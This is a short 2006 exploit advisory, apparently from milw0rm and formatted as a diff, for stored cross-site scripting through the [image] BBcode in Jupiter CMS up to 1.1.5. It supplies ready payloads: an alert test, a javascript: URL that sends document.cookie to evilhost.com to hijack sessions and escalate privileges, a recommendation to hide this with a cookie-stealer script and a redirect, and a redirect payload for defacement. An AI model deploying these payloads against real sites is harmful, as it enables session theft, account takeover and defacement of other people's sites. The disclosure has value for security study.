@@ -1,0 +1,35 @@
+Jupiter CMS <= 1.1.5 multiple XSS attack vectors.
+
+Discovered by: Nomenumbra/[0x4F4C] Date: 3/11/2006 impact:high (privilege escalation,site defacement)
+
+Jupiter CMS (http://www.highstrike.net/) is a dynamic CMS system like mambo or limbo, allowing users
+to subscribe and posts events. Because no filtering is done upon [image] BBcode input, any user is
+capable of inserting arbitrary javascript code, allowing for credential theft leading/session
+hijacking and possibly site defacement.
+
+Examples:
+
+This would make a messagebox pop up saying 'XSS', whenever the events get loaded (on the main page,
+calender,etc): [image=javascript:alert('XSS')]
+
+This would allow an attacker to steal session ID's, which he could insert into his own cookie to
+hijack sessions and elevate his/her privileges:
+
+[image=javascript:window.navigate('http://www.evilhost.com/cookiestealer.php?c='+document.cookie)]
+
+It would be used with SjaakRake's cookie stealer (http://www.milw0rm.com/exploits/1103), with maybe
+the addition of a header("location: ".<anythinghere>), to redirect the user to a page of your choice,
+to avoid suspicion and disclosure of your cookiestealer's location.
+
+This injections would allow an attacker to redirect users to a page of his choice, effectively
+defacing the page:
+
+[image=javascript:window.navigate('http://www.evilhost.com/pwned.html')]
+
+As you can see the possibilities are limitless, as long as you have a bit of fantasy!
+
+Nomenumbra/[0x4F4C]
+
+Questions: zerogue@gmail.com Site: http://0x4f4c.awardspace.com
+
+# milw0rm.com [2006-03-11]
